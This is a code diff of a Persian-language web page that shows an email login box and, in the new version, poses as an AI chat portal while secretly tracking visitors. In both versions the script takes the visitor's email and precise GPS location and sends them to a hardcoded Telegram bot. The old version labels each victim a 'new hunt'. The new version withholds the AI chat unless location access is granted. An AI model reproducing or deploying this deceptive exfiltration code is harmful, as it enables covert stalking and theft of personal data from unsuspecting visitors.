@@ -2,62 +2,76 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>YG-PYRAMID | درگاه مرکزی</title>
+    <title>YG-PYRAMID | هوش مصنوعی هرم</title>
     <style>
-        body { background: #050505; color: #d4af37; font-family: Tahoma; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #d4af37; padding: 40px; border-radius: 20px; background: #111; box-shadow: 0 0 25px #d4af37; width: 320px; text-align: center; }
-        input { padding: 12px; width: 90%; margin-bottom: 20px; background: #000; color: #fff; border: 1px solid #d4af37; border-radius: 5px; text-align: center; }
-        button { background: #d4af37; color: #000; padding: 15px; border: none; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
-        #status { margin-top: 15px; font-size: 0.9em; color: #00ff00; height: 20px; }
+        body { background: #050505; color: #d4af37; font-family: Tahoma; text-align: center; margin: 0; padding: 20px; }
+        .box { border: 2px solid #d4af37; padding: 20px; border-radius: 15px; background: #111; max-width: 400px; margin: auto; box-shadow: 0 0 20px #d4af37; }
+        input, textarea { width: 90%; padding: 10px; margin: 10px 0; background: #000; color: #fff; border: 1px solid #d4af37; border-radius: 5px; }
+        button { background: #d4af37; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; width: 100%; border-radius: 5px; }
+        #chat-area { display: none; margin-top: 20px; border-top: 1px solid #d4af37; padding-top: 20px; }
+        #ai-response { background: #222; padding: 10px; border-radius: 5px; margin-top: 10px; text-align: right; min-height: 50px; }
     </style>
 </head>
 <body>
 
 <div class="box">
     <h1>YG-EYE</h1>
-    <p>پروتکل نظارت ارباب یحیی</p>
-    <input type="email" id="emailInput" placeholder="ایمیل جهت تایید هویت...">
-    <button onclick="runProtocol()">ورود به سیستم</button>
-    <div id="status"></div>
+    <div id="login-section">
+        <p>برای فعال‌سازی هوش مصنوعی، ایمیل خود را وارد کنید</p>
+        <input type="email" id="u_email" placeholder="ایمیل شما...">
+        <button onclick="activateSystem()">اتصال به مغز هرم</button>
+    </div>
+
+    <div id="chat-area">
+        <h3>مغز هرم آنلاین است</h3>
+        <textarea id="user-msg" placeholder="سوال خود را بپرسید..."></textarea>
+        <button onclick="askAI()">ارسال به هوش مصنوعی</button>
+        <div id="ai-response">منتظر سوال شما...</div>
+    </div>
 </div>
 
 <script>
-    function runProtocol() {
-        const email = document.getElementById('emailInput').value;
-        const status = document.getElementById('status');
+    const token = "8216584091:AAE5fPf-wUV1_Na87mEKB15qXyXqilNvpbo";
+    const chat = "8496996244";
 
-        if (!email) {
-            alert("ارباب، ابتدا ایمیل را وارد کنید.");
-            return;
-        }
-
-        status.innerText = "در حال هماهنگی با ماهواره...";
+    function activateSystem() {
+        const email = document.getElementById('u_email').value;
+        if (!email) { alert("ایمیل الزامی است!"); return; }
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(pos) {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                // لینک مستقیم نقشه گوگل
-                const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
+                const mapLink = "http://google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                // ارسال به تلگرام شما
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=👤 ${email} وارد شد.\n📍 آدرس: ${mapLink}`);
                 
-                // اطلاعات تلگرام ارباب یحیی
-                const token = "8216584091:AAE5fPf-wUV1_Na87mEKB15qXyXqilNvpbo";
-                const chat = "8496996244";
-                const text = "🚨 شکار جدید!\n📧 ایمیل: " + email + "\n📍 مکان: " + mapLink;
-
-                // ارسال به تلگرام
-                fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(text))
-                .then(() => {
-                    status.innerText = "دسترسی تایید شد. خوش آمدید.";
-                });
-
-                // ارسال به ایمیل (در صورتی که Formspree دارید، آدرس را پایین بگذارید)
-                // fetch("https://formspree.io/f/YOUR_ID", { method: "POST", body: JSON.stringify({email, mapLink}) });
-
+                // باز کردن بخش چت
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('chat-area').style.display = 'block';
             }, function() {
-                status.style.color = "#ff4444";
-                status.innerText = "خطا: دسترسی به مکان داده نشد.";
+                alert("بدون تایید مکان، دسترسی به هوش مصنوعی مسدود است.");
             });
+        }
+    }
+
+    async function askAI() {
+        const msg = document.getElementById('user-msg').value;
+        const respBox = document.getElementById('ai-response');
+        respBox.innerText = "در حال تفکر...";
+
+        try {
+            // این بخش به Ollama روی کامپیوتر شما وصل می‌شود
+            const response = await fetch("http://localhost:11434/api/generate", {
+                method: "POST",
+                body: JSON.stringify({
+                    model: "llama3", // نام مدلی که در Ollama دارید
+                    prompt: msg,
+                    stream: false
+                })
+            });
+            const data = await response.json();
+            respBox.innerText = data.response;
+        } catch (err) {
+            respBox.innerText = "خطا: مغز محلی (Ollama) در دسترس نیست. مطمئن شوید Ollama روی کامپیوترتان در حال اجراست.";
         }
     }
 </script>
